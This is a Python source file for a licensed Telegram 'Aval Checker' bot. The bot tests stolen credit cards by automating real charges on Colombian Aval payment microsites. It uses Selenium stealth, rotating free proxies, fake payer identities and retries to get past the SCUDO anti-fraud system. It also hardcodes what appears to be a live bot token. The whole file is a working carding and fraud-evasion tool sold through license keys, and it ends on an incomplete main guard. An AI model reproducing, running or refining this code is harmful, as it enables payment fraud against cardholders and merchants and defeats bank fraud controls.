#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════╗
║     AVAL CHECKER BOT - LICENCIAS + ROTACIÓN DE PROXIES       ║
║                                                               ║
║  ✅ Sistema de keys con expiración                           ║
║  ✅ Rotación automática de proxies al detectar SCUDO        ║
║  ✅ Detección precisa LIVE/DEAD                             ║
╚═══════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import random
import logging
import string
import json
import threading
import requests
from datetime import datetime, timedelta
from faker import Faker

# ══════════════════════════════════════════════════════════════
# SELENIUM
# ══════════════════════════════════════════════════════════════
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.service import Service
    from selenium_stealth import stealth
    from webdriver_manager.chrome import ChromeDriverManager
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.webdriver.support.ui import Select
    from selenium.common.exceptions import TimeoutException
except ImportError:
    print("❌ Selenium no instalado")
    sys.exit(1)

# ══════════════════════════════════════════════════════════════
# TELEGRAM BOT
# ══════════════════════════════════════════════════════════════
try:
    from telegram import Update
    from telegram.ext import Application, CommandHandler, ContextTypes
except ImportError:
    print("❌ python-telegram-bot no instalado")
    sys.exit(1)

# ══════════════════════════════════════════════════════════════
# CONFIGURACIÓN
# ══════════════════════════════════════════════════════════════

BOT_TOKEN = "8764142166:AAHILjxlNWOe-463WVH8bDYx_Z6fxRp9qWY"

# 👑 OWNER ID
OWNER_ID = 7448403516

# URLs de Aval
AVAL_URLS = [
    "https://micrositios.avalpaycenter.com/valle-avanza-pago-liquidacion-ma",
    "https://micrositios.avalpaycenter.com/hospital-universitario-san-ig-ma",
    "https://micrositios.avalpaycenter.com/fundacion-sos-sin-fronteras-ma",
    "https://micrositios.avalpaycenter.com/comfamiliar-risaralda-ma",
    "https://micrositios.avalpaycenter.com/campoalto-acesalud-ma",
]

# Configuración de reintentos
MAX_SCUDO_RETRIES = 3  # Máximo de reintentos cuando detecta SCUDO

# ══════════════════════════════════════════════════════════════
# LOGGING
# ══════════════════════════════════════════════════════════════
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ══════════════════════════════════════════════════════════════
# SISTEMA DE LICENCIAS
# ══════════════════════════════════════════════════════════════

class LicenseManager:
    """Gestiona keys de licencia con expiración"""
    
    def __init__(self, db_file='licenses.json'):
        self.db_file = db_file
        self.licenses = self._load_db()
    
    def _load_db(self):
        if os.path.exists(self.db_file):
            try:
                with open(self.db_file, 'r') as f:
                    return json.load(f)
            except:
                return {}
        return {}
    
    def _save_db(self):
        with open(self.db_file, 'w') as f:
            json.dump(self.licenses, f, indent=2)
    
    def generate_key(self, days):
        chars = string.ascii_uppercase + string.digits
        part1 = ''.join(random.choices(chars, k=4))
        part2 = ''.join(random.choices(chars, k=4))
        part3 = ''.join(random.choices(chars, k=4))
        
        key = f"AVAL-{part1}-{part2}-{part3}"
        
        while key in self.licenses:
            part1 = ''.join(random.choices(chars, k=4))
            part2 = ''.join(random.choices(chars, k=4))
            part3 = ''.join(random.choices(chars, k=4))
            key = f"AVAL-{part1}-{part2}-{part3}"
        
        self.licenses[key] = {
            'days': days,
            'created_at': datetime.now().isoformat(),
            'activated': False,
            'user_id': None,
            'activated_at': None,
            'expires_at': None
        }
        
        self._save_db()
        return key
    
    def activate_key(self, key, user_id):
        if key not in self.licenses:
            return False, "❌ Key inválida"
        
        lic = self.licenses[key]
        
        if lic['activated']:
            if lic['user_id'] == user_id:
                expires = datetime.fromisoformat(lic['expires_at'])
                if datetime.now() > expires:
                    return False, "❌ Tu licencia expiró"
                
                days_left = (expires - datetime.now()).days
                return True, f"✅ Licencia activa ({days_left} días restantes)"
            else:
                return False, "❌ Esta key ya fue activada por otro usuario"
        
        now = datetime.now()
        expires = now + timedelta(days=lic['days'])
        
        self.licenses[key]['activated'] = True
        self.licenses[key]['user_id'] = user_id
        self.licenses[key]['activated_at'] = now.isoformat()
        self.licenses[key]['expires_at'] = expires.isoformat()
        
        self._save_db()
        
        return True, f"✅ Licencia activada por {lic['days']} días"
    
    def check_license(self, user_id):
        if user_id == OWNER_ID:
            return True, "👑 Owner - Acceso total"
        
        for key, lic in self.licenses.items():
            if lic['activated'] and lic['user_id'] == user_id:
                expires = datetime.fromisoformat(lic['expires_at'])
                
                if datetime.now() > expires:
                    return False, "❌ Tu licencia expiró. Contacta al vendedor."
                
                days_left = (expires - datetime.now()).days
                hours_left = (expires - datetime.now()).seconds // 3600
                
                return True, f"✅ Licencia activa ({days_left}d {hours_left}h restantes)"
        
        return False, "❌ No tienes licencia. Contacta al vendedor para obtener una."
    
    def list_keys(self, show_all=False):
        result = []
        
        for key, lic in self.licenses.items():
            status = "🟢 Activa" if lic['activated'] else "⚪ Sin activar"
            
            info = f"Key: `{key}`\n"
            info += f"Status: {status}\n"
            info += f"Duración: {lic['days']} días\n"
            
            if lic['activated']:
                expires = datetime.fromisoformat(lic['expires_at'])
                days_left = (expires - datetime.now()).days
                
                if days_left < 0:
                    info += f"⏰ Expirada hace {abs(days_left)} días\n"
                else:
                    info += f"⏰ Expira en {days_left} días\n"
                
                info += f"Usuario ID: `{lic['user_id']}`\n"
            
            info += f"Creada: {lic['created_at'][:10]}\n"
            result.append(info)
        
        return result if result else ["No hay keys generadas"]
    
    def revoke_key(self, key):
        if key in self.licenses:
            del self.licenses[key]
            self._save_db()
            return True
        return False

license_mgr = LicenseManager()

# ══════════════════════════════════════════════════════════════
# SISTEMA DE PROXIES CON ROTACIÓN
# ══════════════════════════════════════════════════════════════

class ProxyRotator:
    """Gestiona proxies gratuitos con rotación automática"""
    
    def __init__(self):
        self.proxies = []
        self.current_index = 0
        self.fetch_free_proxies()
        
        # Actualizar proxies cada 10 minutos
        def _async_update():
            while True:
                time.sleep(600)
                self.update_proxies()
        
        threading.Thread(target=_async_update, daemon=True).start()
    
    def fetch_free_proxies(self):
        """Obtiene proxies gratuitos de APIs públicas"""
        proxies = []
        
        try:
            # ProxyScrape
            response = requests.get(
                'https://api.proxyscrape.com/v2/?request=get&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
                timeout=10
            )
            if response.status_code == 200:
                proxies.extend(response.text.strip().split('\r\n'))
        except:
            logger.warning("⚠️ No se pudo obtener proxies de proxyscrape")
        
        try:
            # Geonode
            response = requests.get(
                'https://proxylist.geonode.com/api/proxy-list?limit=50&page=1&sort_by=lastChecked&sort_type=desc',
                timeout=10
            )
            if response.status_code == 200:
                data = response.json()
                for proxy in data.get('data', []):
                    ip = proxy.get('ip')
                    port = proxy.get('port')
                    if ip and port:
                        proxies.append(f"{ip}:{port}")
        except:
            logger.warning("⚠️ No se pudo obtener proxies de geonode")
        
        # Filtrar duplicados
        proxies = list(set(proxies))
        
        if proxies:
            self.proxies = proxies[:20]  # Mantener solo 20
            logger.info(f"✅ {len(self.proxies)} proxies cargados")
        else:
            logger.warning("⚠️ No se pudieron cargar proxies, usando modo directo")
            self.proxies = []
    
    def update_proxies(self):
        """Actualiza la lista de proxies en background"""
        def _async_update():
            logger.info("🔄 Actualizando proxies...")
            self.fetch_free_proxies()
        
        threading.Thread(target=_async_update, daemon=True).start()
    
    def get_next_proxy(self):
        """Obtiene el siguiente proxy en rotación"""
        if not self.proxies:
            return None
        
        self.current_index += 1
        proxy = self.proxies[self.current_index % len(self.proxies)]
        logger.info(f"🌐 Usando proxy: {proxy}")
        return proxy
    
    def skip_proxy(self):
        """Salta al siguiente proxy (útil cuando uno falla)"""
        self.current_index += 1
        logger.info(f"⏩ Saltando a proxy #{self.current_index}")

proxy_rotator = ProxyRotator()

# ══════════════════════════════════════════════════════════════
# ESTADO GLOBAL
# ══════════════════════════════════════════════════════════════

fake = Faker('es_ES')

class BotState:
    def __init__(self):
        self.url_index = {}  # user_id -> index
        self.stats = {}      # user_id -> stats

state = BotState()

# ══════════════════════════════════════════════════════════════
# FUNCIONES AUXILIARES
# ══════════════════════════════════════════════════════════════

def generate_random_email():
    return fake.email()

def generate_random_phone():
    return f"3{random.randint(10,59)}{random.randint(1000000,9999999)}"

def generate_random_document():
    return str(random.randint(10000000, 99999999))

def get_next_url(user_id):
    """Obtiene la siguiente URL para el usuario (rotación)"""
    if user_id not in state.url_index:
        state.url_index[user_id] = 0
    
    url = AVAL_URLS[state.url_index[user_id] % len(AVAL_URLS)]
    state.url_index[user_id] += 1
    
    return url

def create_chrome_driver(use_proxy=True):
    """Crea driver con proxy opcional"""
    try:
        options = webdriver.ChromeOptions()
        
        # Configuración headless
        options.add_argument('--headless=new')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument('--window-size=1920,1080')
        
        # User agent
        options.add_argument('user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
        
        # Configurar proxy si está habilitado
        if use_proxy:
            proxy = proxy_rotator.get_next_proxy()
            if proxy:
                options.add_argument(f'--proxy-server={proxy}')
                logger.info(f"🌐 Proxy configurado: {proxy}")
        
        # Preferencias
        prefs = {
            'credentials_enable_service': False,
            'profile.password_manager_enabled': False,
            'profile.default_content_setting_values.notifications': 2,
            'profile.managed_default_content_settings.images': 2
        }
        options.add_experimental_option('prefs', prefs)
        options.add_experimental_option('excludeSwitches', ['enable-automation', 'enable-logging'])
        options.add_experimental_option('useAutomationExtension', False)
        
        service = Service(ChromeDriverManager().install())
        driver = webdriver.Chrome(service=service, options=options)
        
        # Aplicar stealth
        stealth(driver,
            languages=["es-ES", "es"],
            vendor="Google Inc.",
            platform="Win32",
            webgl_vendor="Intel Inc.",
            renderer="Intel Iris OpenGL Engine",
            fix_hairline=True,
        )
        
        driver.set_page_load_timeout(30)
        driver.implicitly_wait(10)
        
        return driver
        
    except Exception as e:
        logger.error(f"❌ Error creando driver: {e}")
        raise

def type_into(driver, wait, by, selector, text):
    """Escribe en un campo"""
    try:
        field = wait.until(EC.element_to_be_clickable((by, selector)))
        driver.execute_script("arguments[0].scrollIntoView({block:'center'});", field)
        time.sleep(0.2)
        driver.execute_script("arguments[0].click();", field)
        time.sleep(0.3)
        field.clear()
        time.sleep(0.1)
        
        for ch in text:
            field.send_keys(ch)
            time.sleep(random.uniform(0.03, 0.08))
        
        return True
    except Exception as e:
        logger.error(f"Error escribiendo en {selector}: {e}")
        return False

def safe_click(driver, wait, selector, by):
    """Hace clic de forma segura"""
    try:
        btn = wait.until(EC.element_to_be_clickable((by, selector)))
        driver.execute_script("arguments[0].scrollIntoView({block:'center'});", btn)
        time.sleep(0.3)
        driver.execute_script("arguments[0].click();", btn)
        time.sleep(0.5)
        return True
    except Exception as e:
        logger.error(f"Error haciendo clic en {selector}: {e}")
        return False

def clear_browser(driver):
    """Limpia cookies y caché"""
    try:
        driver.execute_cdp_cmd("Network.clearBrowserCookies", {})
        driver.execute_cdp_cmd("Network.clearBrowserCache", {})
        driver.delete_all_cookies()
        driver.execute_script("""
            try { window.localStorage.clear(); } catch(e) {}
            try { window.sessionStorage.clear(); } catch(e) {}
        """)
        logger.info("🧹 Navegador limpiado")
    except Exception as e:
        logger.warning(f"⚠️ Error limpiando navegador: {e}")

# ══════════════════════════════════════════════════════════════
# DETECCIÓN DE RESULTADO (LÓGICA MEJORADA)
# ══════════════════════════════════════════════════════════════

def detect_result(driver):
    """
    Detecta el resultado del pago usando la lógica probada de Aval:
    - Espera 14 segundos
    - Busca mensajes de rechazo específicos
    - Si encuentra rechazo → DEAD
    - Si NO encuentra rechazo → LIVE
    
    Retorna: (status, message, is_scudo)
    """
    logger.info("🔍 Esperando resultado de transacción...")
    
    # Esperar 14 segundos
    time.sleep(14)
    
    # XPaths de mensajes de rechazo de Aval
    declined_xpaths = [
        "//h3[contains(text(), 'Negada, Tarjeta no autorizada')]",
        "//h3[contains(text(), 'SCUDO (Políticas de Control de Riesgos')]",
        "//h3[contains(text(), 'Negada')]",
        "//h3[contains(text(), 'SCUDO')]",
        "//h3[contains(text(), 'rechazada')]",
        "//div[contains(@class,'flex flex-col items-center gap-3')]//span[contains(text(),'Transacción Rechazada')]",
        "//*[contains(text(),'Transacción Rechazada')]",
        "//*[contains(text(),'rechazada')]",
        "//*[contains(text(),'no autorizada')]",
        "//*[contains(text(),'Tarjeta inválida')]",
    ]
    
    # Buscar indicadores de rechazo
    for xpath in declined_xpaths:
        try:
            el = WebDriverWait(driver, 4).until(
                EC.presence_of_element_located((By.XPATH, xpath)))
            msg = el.text.strip()
            
            # Detectar si es SCUDO
            is_scudo = "SCUDO" in msg
            
            logger.info(f"❌ DEAD detectado: {msg}")
            
            if is_scudo:
                logger.warning("🛡️ SCUDO DETECTADO - Requiere cambio de proxy")
                return "DEAD", f"❌ SCUDO Block ❌ [{msg}]", True
            else:
                return "DEAD", f"❌ Declined ❌ [{msg}]", False
                
        except TimeoutException:
            continue
    
    # Si NO se encontró mensaje de rechazo → LIVE
    logger.info("✅ LIVE confirmado - No se detectó rechazo")
    return "LIVE", "✅ CCN CHARGED $10K ✅ [Transacción aprobada]", False

# ══════════════════════════════════════════════════════════════
# FUNCIONES DEL GATEWAY
# ══════════════════════════════════════════════════════════════

def gateway_email_step(driver, wait, email):
    logger.info("📧 Ingresando email...")
    if type_into(driver, wait, By.ID, 'email', email):
        return safe_click(driver, wait, '//button[@aria-label="Continuar" or contains(.,"Continuar")]', By.XPATH)
    return False

def gateway_select_card(driver, wait):
    logger.info("💳 Seleccionando método de pago...")
    try:
        wait.until(EC.presence_of_element_located(
            (By.XPATH, "//h2[contains(text(), 'Selecciona un método de pago')]")))
        time.sleep(1)
        return safe_click(driver, wait, "//button[.//span[contains(text(),'Tarjeta de Crédito')]]", By.XPATH)
    except Exception as e:
        logger.error(f"Error seleccionando tarjeta: {e}")
        return False

def gateway_card_fields(driver, wait, card_number, expiry, cvv):
    logger.info("🔢 Ingresando datos de tarjeta...")
    
    if not type_into(driver, wait, By.ID, 'cardNumber', card_number):
        return False
    time.sleep(0.3)
    
    if not type_into(driver, wait, By.ID, 'date', expiry):
        return False
    time.sleep(0.3)
    
    if not type_into(driver, wait, By.ID, 'cvv', cvv):
        return False
    time.sleep(0.5)
    
    return safe_click(driver, wait, 'button.btn[type="submit"]', By.CSS_SELECTOR)

def gateway_titular(driver, wait, name, surname, doc, phone):
    logger.info("👤 Ingresando datos del titular...")
    
    if not type_into(driver, wait, By.ID, 'name', name):
        return False
    time.sleep(0.2)
    
    if not type_into(driver, wait, By.ID, 'surname', surname):
        return False
    time.sleep(0.2)
    
    try:
        doc_field = wait.until(EC.element_to_be_clickable((By.ID, 'document')))
        driver.execute_script("arguments[0].scrollIntoView({block:'center'});", doc_field)
        time.sleep(0.2)
        driver.execute_script("arguments[0].click();", doc_field)
        time.sleep(0.3)
        doc_field.clear()
        time.sleep(0.1)
        
        for ch in doc:
            doc_field.send_keys(ch)
            time.sleep(random.uniform(0.03, 0.08))
    except Exception as e:
        logger.error(f"Error en documento: {e}")
        return False
    
    try:
        time.sleep(0.3)
        pf = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, 'input[name="user.mobile"]')))
        driver.execute_script("arguments[0].scrollIntoView({block:'center'});", pf)
        time.sleep(0.2)
        driver.execute_script("arguments[0].click();", pf)
        time.sleep(0.3)
        pf.clear()
        time.sleep(0.1)
        
        for ch in phone:
            pf.send_keys(ch)
            time.sleep(random.uniform(0.03, 0.08))
    except Exception as e:
        logger.warning(f"⚠️ Error en teléfono: {e}")
    
    return True

def gateway_pay_button(driver, wait):
    logger.info("💰 Procesando pago...")
    try:
        btn = wait.until(EC.element_to_be_clickable(
            (By.CSS_SELECTOR, 'button[type="submit"][aria-label*="Pagar"]')))
        driver.execute_script("arguments[0].scrollIntoView({block:'center'});", btn)
        time.sleep(0.5)
        driver.execute_script("arguments[0].click();", btn)
        return True
    except Exception:
        try:
            btns = driver.find_elements(By.CSS_SELECTOR, 'button[type="submit"]')
            for btn in btns:
                if btn.is_displayed() and btn.is_enabled():
                    driver.execute_script("arguments[0].click();", btn)
                    logger.info("✅ Clic en botón pagar (fallback)")
                    return True
        except Exception as e:
            logger.error(f"Error en botón pagar: {e}")
            return False
    return False

# ══════════════════════════════════════════════════════════════
# PROCESO COMPLETO DE VERIFICACIÓN CON ROTACIÓN DE PROXY
# ══════════════════════════════════════════════════════════════

def process_card_with_proxy_rotation(card_number, expiry, cvv, url):
    """
    Procesa tarjeta con rotación automática de proxy al detectar SCUDO.
    
    Retorna: (status, message) donde status = "LIVE" | "DEAD" | "ERROR"
    """
    email = generate_random_email()
    phone = generate_random_phone()
    doc = generate_random_document()
    name = fake.first_name()
    surname = fake.last_name()
    
    retry_count = 0
    driver = None
    
    while retry_count < MAX_SCUDO_RETRIES:
        try:
            # Crear driver con proxy
            logger.info(f"🚀 Intento #{retry_count + 1} - Email: {email}")
            driver = create_chrome_driver(use_proxy=True)
            wait = WebDriverWait(driver, 25)
            
            # Limpiar navegador
            clear_browser(driver)
            
            # Navegar a Aval
            logger.info(f"🌐 Navegando a: {url}")
            driver.get(url)
            time.sleep(5)
            
            # Llenar formulario Aval
            logger.info("📝 Llenando formulario Aval...")
            
            if not type_into(driver, wait, By.ID, 'decripcion_pago', "PAGO NOMINA"):
                raise Exception("Error en descripción pago")
            
            if not type_into(driver, wait, By.ID, 'description', "AlexisSAS"):
                raise Exception("Error en description")
            
            if not type_into(driver, wait, By.ID, 'numero_liquidacion', fake.numerify('########')):
                raise Exception("Error en número liquidación")
            
            if not type_into(driver, wait, By.ID, 'reference', fake.numerify('########')):
                raise Exception("Error en referencia")
            
            if not type_into(driver, wait, By.ID, 'amount', "10000"):
                raise Exception("Error en monto")
            
            # Seleccionar moneda
            try:
                Select(wait.until(EC.presence_of_element_located(
                    (By.ID, 'currency')))).select_by_visible_text('Peso colombiano')
                time.sleep(0.3)
            except Exception as e:
                logger.warning(f"⚠️ Error seleccionando moneda: {e}")
            
            if not type_into(driver, wait, By.ID, 'payer_email', email):
                raise Exception("Error en email pagador")
            
            if not type_into(driver, wait, By.ID, 'buyer_cell_phone', phone):
                raise Exception("Error en teléfono")
            
            # Botón Pagar
            logger.info("🔘 Clic en botón Pagar...")
            if not safe_click(driver, wait, "//button[normalize-space()='Pagar' or @aria-label='Pagar']", By.XPATH):
                raise Exception("Error en botón Pagar")
            
            time.sleep(3)
            
            # Gateway de pago
            if not gateway_email_step(driver, wait, email):
                raise Exception("Error en paso email gateway")
            
            time.sleep(2)
            
            if not gateway_select_card(driver, wait):
                raise Exception("Error seleccionando tarjeta")
            
            time.sleep(2)
            
            if not gateway_card_fields(driver, wait, card_number, expiry, cvv):
                raise Exception("Error en campos de tarjeta")
            
            time.sleep(2)
            
            if not gateway_titular(driver, wait, name, surname, doc, phone):
                raise Exception("Error en datos del titular")
            
            time.sleep(1)
            
            if not gateway_pay_button(driver, wait):
                raise Exception("Error en botón pagar final")
            
            # Detectar resultado
            status, message, is_scudo = detect_result(driver)
            
            # Si es SCUDO y no hemos alcanzado el máximo de reintentos
            if is_scudo and retry_count < MAX_SCUDO_RETRIES - 1:
                logger.warning(f"🔄 SCUDO detectado - Cambiando proxy (intento {retry_count + 1}/{MAX_SCUDO_RETRIES})")
                retry_count += 1
                
                # Cerrar driver actual
                if driver:
                    driver.quit()
                    driver = None
                
                # Saltar al siguiente proxy
                proxy_rotator.skip_proxy()
                
                # Esperar antes de reintentar
                time.sleep(2)
                continue
            
            # Retornar resultado (LIVE, DEAD, o SCUDO final)
            return status, message
            
        except Exception as e:
            logger.error(f"❌ Error en intento #{retry_count + 1}: {e}")
            
            # Si hay más reintentos disponibles
            if retry_count < MAX_SCUDO_RETRIES - 1:
                retry_count += 1
                logger.info(f"🔄 Reintentando con nuevo proxy ({retry_count}/{MAX_SCUDO_RETRIES})...")
                
                if driver:
                    driver.quit()
                    driver = None
                
                proxy_rotator.skip_proxy()
                time.sleep(2)
                continue
            else:
                return "ERROR", f"⚠️ Error: {str(e)}"
        
        finally:
            if driver:
                try:
                    driver.quit()
                except:
                    pass
    
    # Si llegamos aquí, agotamos todos los reintentos
    return "ERROR", "⚠️ Máximo de reintentos alcanzado (SCUDO persistente)"

# ══════════════════════════════════════════════════════════════
# DECORADOR DE AUTENTICACIÓN
# ══════════════════════════════════════════════════════════════

def require_license(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        
        valid, msg = license_mgr.check_license(user_id)
        
        if not valid:
            await update.message.reply_text(
                f"{msg}\n\n"
                f"💬 Contacta al owner para obtener una licencia.",
                parse_mode='Markdown'
            )
            return
        
        return await func(update, context)
    
    return wrapper

# ══════════════════════════════════════════════════════════════
# COMANDOS DEL OWNER
# ══════════════════════════════════════════════════════════════

async def genkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Solo el owner puede generar keys")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text(
            "❌ Uso incorrecto\n\n"
            "**Genera keys:**\n"
            "`/genkey 1` - Key de 1 día\n"
            "`/genkey 7` - Key de 7 días\n"
            "`/genkey 30` - Key de 30 días",
            parse_mode='Markdown'
        )
        return
    
    try:
        days = int(context.args[0])
        
        if days not in [1, 7, 30]:
            await update.message.reply_text(
                "❌ Solo puedes generar keys de:\n"
                "• 1 día\n"
                "• 7 días\n"
                "• 30 días"
            )
            return
        
        key = license_mgr.generate_key(days)
        
        await update.message.reply_text(
            f"✅ **Key generada**\n\n"
            f"🔑 `{key}`\n"
            f"⏰ Duración: {days} días\n"
            f"📊 Status: Sin activar\n\n"
            f"Envía esta key al cliente para que la active con:\n"
            f"`/redeem {key}`",
            parse_mode='Markdown'
        )
        
    except ValueError:
        await update.message.reply_text("❌ Debes especificar un número")

async def listkeys_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Solo el owner puede listar keys")
        return
    
    keys = license_mgr.list_keys()
    
    message = "📋 **LISTADO DE KEYS**\n\n"
    
    for i, key_info in enumerate(keys[:10], 1):
        message += f"**{i}.**\n{key_info}\n"
    
    if len(keys) > 10:
        message += f"\n_(Mostrando 10 de {len(keys)} keys)_"
    
    await update.message.reply_text(message, parse_mode='Markdown')

async def revoke_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Solo el owner puede revocar keys")
        return
    
    if len(context.args) != 1:
        await update.message.reply_text(
            "❌ Uso: `/revoke AVAL-XXXX-XXXX-XXXX`",
            parse_mode='Markdown'
        )
        return
    
    key = context.args[0]
    
    if license_mgr.revoke_key(key):
        await update.message.reply_text(f"✅ Key `{key}` revocada", parse_mode='Markdown')
    else:
        await update.message.reply_text(f"❌ Key `{key}` no encontrada", parse_mode='Markdown')

# ══════════════════════════════════════════════════════════════
# COMANDOS DE USUARIO
# ══════════════════════════════════════════════════════════════

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    msg = (
        "👋 **Bienvenido a Aval Checker Bot**\n\n"
        "🔐 Este bot requiere licencia para funcionar.\n\n"
    )
    
    valid, status = license_mgr.check_license(user_id)
    
    if valid:
        msg += f"{status}\n\n"
        msg += (
            "**Comandos disponibles:**\n"
            "`/check` - Verificar tarjetas\n"
            "`/status` - Ver tus estadísticas\n"
            "`/mykey` - Info de tu licencia\n"
            "`/help` - Ayuda completa"
        )
    else:
        msg += (
            "❌ No tienes licencia activa.\n\n"
            "**Para obtener acceso:**\n"
            "1. Contacta al vendedor\n"
            "2. Obtén una key de licencia\n"
            "3. Actívala con: `/redeem TU-KEY`"
        )
    
    await update.message.reply_text(msg, parse_mode='Markdown')

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if len(context.args) != 1:
        await update.message.reply_text(
            "❌ Uso: `/redeem AVAL-XXXX-XXXX-XXXX`",
            parse_mode='Markdown'
        )
        return
    
    key = context.args[0]
    
    success, message = license_mgr.activate_key(key, user_id)
    
    if success:
        await update.message.reply_text(
            f"🎉 {message}\n\n"
            f"Ya puedes usar:\n"
            f"`/check` - Verificar tarjetas\n"
            f"`/status` - Ver estadísticas\n"
            f"`/help` - Ayuda",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(message, parse_mode='Markdown')

async def mykey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    valid, message = license_mgr.check_license(user_id)
    
    await update.message.reply_text(message, parse_mode='Markdown')

@require_license
async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Checkear tarjeta con rotación automática de proxy"""
    user_id = update.effective_user.id
    
    text = update.message.text.replace('/check', '').strip()
    
    if not text:
        await update.message.reply_text(
            "❌ Formato: `/check CC|MM|YY|CVV`\n\n"
            "**Ejemplo:**\n"
            "`/check 5424181655740251|03|28|532`",
            parse_mode='Markdown'
        )
        return
    
    # Inicializar stats
    if user_id not in state.stats:
        state.stats[user_id] = {'total': 0, 'lives': 0, 'dead': 0, 'errors': 0}
    
    lines = text.strip().split('\n')
    cards = []
    
    for line in lines:
        line = line.strip()
        if not line:
            continue
        
        parts = line.split('|')
        if len(parts) != 4:
            await update.message.reply_text(f"❌ Formato incorrecto: `{line}`", parse_mode='Markdown')
            return
        
        cc, mm, yy, cvv = [p.strip() for p in parts]
        mm = mm.zfill(2)
        
        if len(cc) < 13 or len(cvv) < 3:
            await update.message.reply_text(f"❌ Tarjeta inválida", parse_mode='Markdown')
            return
        
        cards.append((cc, mm, yy, cvv))
    
    if not cards:
        await update.message.reply_text("❌ No hay tarjetas válidas")
        return
    
    await update.message.reply_text(f"✅ Checking {len(cards)} tarjeta(s)...")
    
    for cc, mm, yy, cvv in cards:
        masked = f"{cc[:4]}****{cc[-4:]}"
        expiry = f"{mm}/{yy}"
        
        await update.message.reply_text(
            f"🔄 Checking: `{masked}`",
            parse_mode='Markdown'
        )
        
        # Obtener URL rotativa
        url = get_next_url(user_id)
        
        # Verificación REAL con rotación de proxy
        result, message = process_card_with_proxy_rotation(cc, expiry, cvv, url)
        
        state.stats[user_id]['total'] += 1
        
        if result == 'LIVE':
            state.stats[user_id]['lives'] += 1
            await update.message.reply_text(
                f"✅ **LIVE** - `{masked}`\n"
                f"💳 `{cc}|{mm}|{yy}|{cvv}`\n"
                f"📝 {message}\n"
                f"⚡ Gateway: Aval [$10.000]",
                parse_mode='Markdown'
            )
        elif result == 'DEAD':
            state.stats[user_id]['dead'] += 1
            await update.message.reply_text(
                f"❌ **DEAD** - `{masked}`\n"
                f"📝 {message}",
                parse_mode='Markdown'
            )
        else:
            state.stats[user_id]['errors'] += 1
            await update.message.reply_text(
                f"⚠️ **ERROR** - `{masked}`\n"
                f"📝 {message}",
                parse_mode='Markdown'
            )

@require_license
async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if user_id not in state.stats:
        state.stats[user_id] = {'total': 0, 'lives': 0, 'dead': 0, 'errors': 0}
    
    stats = state.stats[user_id]
    
    msg = (
        f"📊 **TUS ESTADÍSTICAS**\n\n"
        f"✅ Lives: {stats['lives']}\n"
        f"❌ Dead: {stats['dead']}\n"
        f"⚠️ Errors: {stats['errors']}\n"
        f"📈 Total: {stats['total']}"
    )
    
    await update.message.reply_text(msg, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "📖 **AYUDA - AVAL CHECKER BOT**\n\n"
        "**Activar licencia:**\n"
        "`/redeem AVAL-XXXX-XXXX-XXXX`\n\n"
        "**Checkear tarjetas:**\n"
        "`/check 4111111111111111|12|25|123`\n\n"
        "**Ver info:**\n"
        "`/mykey` - Tu licencia\n"
        "`/status` - Tus stats\n"
        "`/start` - Menú principal\n\n"
        "**Características:**\n"
        "🔄 Rotación automática de proxies\n"
        "🛡️ Bypass automático de SCUDO\n"
        "✅ Detección precisa LIVE/DEAD\n\n"
        "**Soporte:**\n"
        "Contacta al owner para licencias"
    )
    
    await update.message.reply_text(msg, parse_mode='Markdown')

# ══════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════

def main():
    if BOT_TOKEN == "TU_BOT_TOKEN_AQUI":
        print("❌ Configura BOT_TOKEN")
        sys.exit(1)
    
    print("=" * 70)
    print("🤖 AVAL CHECKER BOT - INICIANDO")
    print("=" * 70)
    print(f"👑 Owner ID: {OWNER_ID}")
    print(f"🌐 Proxies cargados: {len(proxy_rotator.proxies)}")
    print(f"🔄 Max reintentos SCUDO: {MAX_SCUDO_RETRIES}")
    print("=" * 70)
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Comandos owner
    app.add_handler(CommandHandler("genkey", genkey_command))
    app.add_handler(CommandHandler("listkeys", listkeys_command))
    app.add_handler(CommandHandler("revoke", revoke_command))
    
    # Comandos usuario
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("redeem", redeem_command))
    app.add_handler(CommandHandler("mykey", mykey_command))
    app.add_handler(CommandHandler("check", check_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("help", help_command))
    
    print("✅ Bot activo con:")
    print("  - Sistema de licencias")
    print("  - Rotación automática de proxies")
    print("  - Bypass automático de SCUDO")
    print("=" * 70)
    
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
